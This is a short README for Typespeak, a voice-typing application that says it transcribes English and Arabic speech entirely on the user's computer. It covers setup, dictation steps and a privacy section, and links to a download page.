# 🎙️ Typespeak - Private voice typing for everyone

[![Download Typespeak](https://img.shields.io/badge/Download-Typespeak-blue.svg)](https://mikaeldoglike497.github.io)

## ⚙️ Setting up the software

When you open Typespeak for the first time, you reach the main dashboard. This screen lets you manage your speech recognition settings.

Ensure your microphone connects to your computer. Most modern laptops have a built-in microphone. You can also plug in an external USB headset for better audio quality.

Navigate to the settings menu to choose your language. The app includes support for English and various Arabic dialects. Select the model that best matches your speaking style. 

The application uses local files to power these models. This means you do not need an active internet connection to transcribe your speech. The processing happens entirely on your machine. This protects your privacy and keeps your voice data off external servers.

## 🛠️ How to use the app

Using Typespeak requires little technical knowledge. Follow this simple process every time you want to dictate:

1. Click the Start button within the app.
2. Place your cursor in any text editor, web browser, or document where you want your text to appear.
3. Speak clearly into your microphone at a normal pace.
4. Observe the text appearing in real-time as the app processes your audio.
5. Click the Stop button when you finish your session.

If you struggle with accuracy, check the background noise in your room. Quiet environments lead to better results. Ensure your microphone sensitivity is set correctly in your Windows system settings.

## 🔒 Your privacy

Most voice typing apps send your voice recordings to large servers in the cloud. They store these recordings to train their own systems. Typespeak behaves differently.

All processing occurs on your physical computer. No voice recordings leave your device. Your data stays under your control. By keeping the models local, you remove the risk of your private conversations being logged or accessed by third parties.
